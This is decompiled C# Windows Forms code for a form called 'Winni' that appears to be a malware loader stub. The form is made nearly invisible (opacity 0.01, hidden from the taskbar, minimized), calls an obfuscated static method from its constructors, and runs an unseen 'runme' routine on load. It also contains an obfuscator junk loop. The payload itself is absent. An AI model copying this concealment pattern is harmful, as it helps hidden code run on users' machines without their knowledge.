using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;

namespace NS;

[DesignerGenerated]
public class Winni : Form
{
	private static List<WeakReference> __ENCList;

	private IContainer components;

	[AccessedThroughProperty("Panel1")]
	private Panel _Panel1;

	[AccessedThroughProperty("GroupBox1")]
	private GroupBox _GroupBox1;

	[AccessedThroughProperty("ProgressBar1")]
	private ProgressBar _ProgressBar1;

	[AccessedThroughProperty("RadioButton1")]
	private RadioButton _RadioButton1;

	[AccessedThroughProperty("TextBox1")]
	private TextBox _TextBox1;

	[AccessedThroughProperty("RadioButton2")]
	private RadioButton _RadioButton2;

	[AccessedThroughProperty("RadioButton3")]
	private RadioButton _RadioButton3;

	[AccessedThroughProperty("Label1")]
	private Label _Label1;

	[AccessedThroughProperty("Label2")]
	private Label _Label2;

	[AccessedThroughProperty("LinkLabel1")]
	private LinkLabel _LinkLabel1;

	internal virtual Panel Panel1
	{
		[DebuggerNonUserCode]
		get
		{
			return _Panel1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Panel1 = value;
		}
	}

	internal virtual GroupBox GroupBox1
	{
		[DebuggerNonUserCode]
		get
		{
			return _GroupBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_GroupBox1 = value;
		}
	}

	internal virtual ProgressBar ProgressBar1
	{
		[DebuggerNonUserCode]
		get
		{
			return _ProgressBar1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_ProgressBar1 = value;
		}
	}

	internal virtual RadioButton RadioButton1
	{
		[DebuggerNonUserCode]
		get
		{
			return _RadioButton1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_RadioButton1 = value;
		}
	}

	internal virtual TextBox TextBox1
	{
		[DebuggerNonUserCode]
		get
		{
			return _TextBox1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_TextBox1 = value;
		}
	}

	internal virtual RadioButton RadioButton2
	{
		[DebuggerNonUserCode]
		get
		{
			return _RadioButton2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_RadioButton2 = value;
		}
	}

	internal virtual RadioButton RadioButton3
	{
		[DebuggerNonUserCode]
		get
		{
			return _RadioButton3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_RadioButton3 = value;
		}
	}

	internal virtual Label Label1
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label1 = value;
		}
	}

	internal virtual Label Label2
	{
		[DebuggerNonUserCode]
		get
		{
			return _Label2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_Label2 = value;
		}
	}

	internal virtual LinkLabel LinkLabel1
	{
		[DebuggerNonUserCode]
		get
		{
			return _LinkLabel1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			_LinkLabel1 = value;
		}
	}

	[DebuggerNonUserCode]
	static Winni()
	{
		Class2.IoCInX5zUDeVY();
		__ENCList = new List<WeakReference>();
	}

	[DebuggerNonUserCode]
	public Winni()
	{
		Class2.IoCInX5zUDeVY();
		((Form)this)._002Ector();
		((Form)this).add_Load((EventHandler)Form1_Load);
		__ENCAddToList(this);
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	private static void __ENCAddToList(object value)
	{
		checked
		{
			lock (__ENCList)
			{
				if (__ENCList.Count == __ENCList.Capacity)
				{
					int num = 0;
					int num2 = __ENCList.Count - 1;
					int num3 = 0;
					while (true)
					{
						int num4 = num3;
						int num5 = num2;
						if (num4 > num5)
						{
							break;
						}
						WeakReference weakReference = __ENCList[num3];
						if (weakReference.IsAlive)
						{
							if (num3 != num)
							{
								__ENCList[num] = __ENCList[num3];
							}
							num++;
						}
						num3++;
					}
					__ENCList.RemoveRange(num, __ENCList.Count - num);
					__ENCList.Capacity = __ENCList.Count;
				}
				__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
			}
		}
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if ((disposing && components != null) ? true : false)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		//IL_0073: Expected O, but got Unknown
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		//IL_007e: Expected O, but got Unknown
		//IL_059f: Unknown result type (might be due to invalid IL or missing references)
		//IL_05a9: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Winni));
		Panel1 = new Panel();
		GroupBox1 = new GroupBox();
		ProgressBar1 = new ProgressBar();
		RadioButton1 = new RadioButton();
		TextBox1 = new TextBox();
		RadioButton2 = new RadioButton();
		RadioButton3 = new RadioButton();
		Label1 = new Label();
		Label2 = new Label();
		LinkLabel1 = new LinkLabel();
		((Control)this).SuspendLayout();
		Panel panel = Panel1;
		Point location = new Point(115, 297);
		((Control)panel).set_Location(location);
		((Control)Panel1).set_Name("Panel1");
		Panel panel2 = Panel1;
		Size size = new Size(200, 100);
		((Control)panel2).set_Size(size);
		((Control)Panel1).set_TabIndex(0);
		GroupBox groupBox = GroupBox1;
		location = new Point(414, 214);
		((Control)groupBox).set_Location(location);
		((Control)GroupBox1).set_Name("GroupBox1");
		GroupBox groupBox2 = GroupBox1;
		size = new Size(200, 100);
		((Control)groupBox2).set_Size(size);
		((Control)GroupBox1).set_TabIndex(1);
		GroupBox1.set_TabStop(false);
		GroupBox1.set_Text("GroupBox1");
		ProgressBar progressBar = ProgressBar1;
		location = new Point(52, 253);
		((Control)progressBar).set_Location(location);
		((Control)ProgressBar1).set_Name("ProgressBar1");
		ProgressBar progressBar2 = ProgressBar1;
		size = new Size(8, 8);
		((Control)progressBar2).set_Size(size);
		((Control)ProgressBar1).set_TabIndex(2);
		((ButtonBase)RadioButton1).set_AutoSize(true);
		RadioButton radioButton = RadioButton1;
		location = new Point(35, 341);
		((Control)radioButton).set_Location(location);
		((Control)RadioButton1).set_Name("RadioButton1");
		RadioButton radioButton2 = RadioButton1;
		size = new Size(90, 17);
		((Control)radioButton2).set_Size(size);
		((Control)RadioButton1).set_TabIndex(3);
		RadioButton1.set_TabStop(true);
		((ButtonBase)RadioButton1).set_Text("RadioButton1");
		((ButtonBase)RadioButton1).set_UseVisualStyleBackColor(true);
		TextBox textBox = TextBox1;
		location = new Point(229, 260);
		((Control)textBox).set_Location(location);
		((Control)TextBox1).set_Name("TextBox1");
		TextBox textBox2 = TextBox1;
		size = new Size(100, 20);
		((Control)textBox2).set_Size(size);
		((Control)TextBox1).set_TabIndex(4);
		((ButtonBase)RadioButton2).set_AutoSize(true);
		RadioButton radioButton3 = RadioButton2;
		location = new Point(142, 258);
		((Control)radioButton3).set_Location(location);
		((Control)RadioButton2).set_Name("RadioButton2");
		RadioButton radioButton4 = RadioButton2;
		size = new Size(90, 17);
		((Control)radioButton4).set_Size(size);
		((Control)RadioButton2).set_TabIndex(5);
		RadioButton2.set_TabStop(true);
		((ButtonBase)RadioButton2).set_Text("RadioButton2");
		((ButtonBase)RadioButton2).set_UseVisualStyleBackColor(true);
		((ButtonBase)RadioButton3).set_AutoSize(true);
		RadioButton radioButton5 = RadioButton3;
		location = new Point(144, 241);
		((Control)radioButton5).set_Location(location);
		((Control)RadioButton3).set_Name("RadioButton3");
		RadioButton radioButton6 = RadioButton3;
		size = new Size(90, 17);
		((Control)radioButton6).set_Size(size);
		((Control)RadioButton3).set_TabIndex(6);
		RadioButton3.set_TabStop(true);
		((ButtonBase)RadioButton3).set_Text("RadioButton3");
		((ButtonBase)RadioButton3).set_UseVisualStyleBackColor(true);
		Label1.set_AutoSize(true);
		Label label = Label1;
		location = new Point(239, 247);
		((Control)label).set_Location(location);
		((Control)Label1).set_Name("Label1");
		Label label2 = Label1;
		size = new Size(39, 13);
		((Control)label2).set_Size(size);
		((Control)Label1).set_TabIndex(7);
		Label1.set_Text("Label1");
		Label2.set_AutoSize(true);
		Label label3 = Label2;
		location = new Point(343, 211);
		((Control)label3).set_Location(location);
		((Control)Label2).set_Name("Label2");
		Label label4 = Label2;
		size = new Size(39, 13);
		((Control)label4).set_Size(size);
		((Control)Label2).set_TabIndex(8);
		Label2.set_Text("Label2");
		((Label)LinkLabel1).set_AutoSize(true);
		LinkLabel linkLabel = LinkLabel1;
		location = new Point(92, 212);
		((Control)linkLabel).set_Location(location);
		((Control)LinkLabel1).set_Name("LinkLabel1");
		LinkLabel linkLabel2 = LinkLabel1;
		size = new Size(59, 13);
		((Control)linkLabel2).set_Size(size);
		((Control)LinkLabel1).set_TabIndex(9);
		((Label)LinkLabel1).set_TabStop(true);
		LinkLabel1.set_Text("LinkLabel1");
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		size = new Size(355, 51);
		((Form)this).set_ClientSize(size);
		((Control)this).get_Controls().Add((Control)(object)LinkLabel1);
		((Control)this).get_Controls().Add((Control)(object)Label2);
		((Control)this).get_Controls().Add((Control)(object)Label1);
		((Control)this).get_Controls().Add((Control)(object)RadioButton3);
		((Control)this).get_Controls().Add((Control)(object)RadioButton2);
		((Control)this).get_Controls().Add((Control)(object)TextBox1);
		((Control)this).get_Controls().Add((Control)(object)RadioButton1);
		((Control)this).get_Controls().Add((Control)(object)ProgressBar1);
		((Control)this).get_Controls().Add((Control)(object)GroupBox1);
		((Control)this).get_Controls().Add((Control)(object)Panel1);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Control)this).set_Name("Winni");
		((Form)this).set_Opacity(0.01);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_WindowState((FormWindowState)1);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}

	private void mNUn04Xd()
	{
		decimal num = default(decimal);
		while (true)
		{
			try
			{
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				while (true)
				{
					num = default(decimal);
				}
			}
			num = new decimal(6789134L);
		}
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		aL.runme();
	}
}
